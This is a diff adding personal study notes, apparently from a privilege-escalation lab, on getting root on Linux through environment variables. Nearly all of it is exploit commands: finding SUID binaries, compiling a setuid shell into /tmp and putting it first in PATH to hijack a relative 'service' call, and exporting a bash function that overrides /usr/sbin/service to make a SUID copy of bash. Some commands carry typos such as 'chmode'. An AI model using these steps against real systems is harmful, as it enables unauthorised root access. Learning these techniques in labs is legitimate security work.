@@ -1,0 +1,43 @@
+Escalation via Environmental Variables:
+-Start an existant service but with modified PATH to become root
+    see Environement Variables:
+        env:
+            ex: PATH,PWD,HOME,OLDPWD
+        
+        find / -type -f -perm -04000 -ls 2>/dev/null
+            IF we find "suid-env":
+                strings /usr/local/bin/suid-env:
+                    "service apache2 start"
+                print $PATH <--- This will display the full path where "service" comes from
+
+            We will inject a code into the full PATH needed to invoke "service":
+                echo 'int main() {setgid(0); setuid(0); system("/bin/bash"); return 0;}' > /tmp/service.c
+                gcc /tmp/service.c -o /tmp/service
+
+                export PATH=/tmp:$PATH
+                print $PATH <--- We can see that "/tmp" is called first when the service is invoked
+                
+            Now we will see if we have by pass the PATH to become root:
+                /usr/local/bin/suid-env
+                whoami
+
+
+
+            IF we find "suid-env2":
+            strings /usr/local/bin/suid-env2:
+                "usr/sbin/service apache2 start"
+            print $PATH <--- This will display the full path where "service" comes from
+
+            We will create a "malicious" function:
+                function /usr/sbin/service() { cp /bin/bash /tmp && chmode +s /tmp/bash && /tmp/bash -p;}
+                export -f /usr/sbin/service <-- export -f == refere to shell function
+
+
+            Now we will see if we have by pass the PATH to become root:
+                /usr/local/bin/suid-env2
+                whoami
+
+            
+
+
+
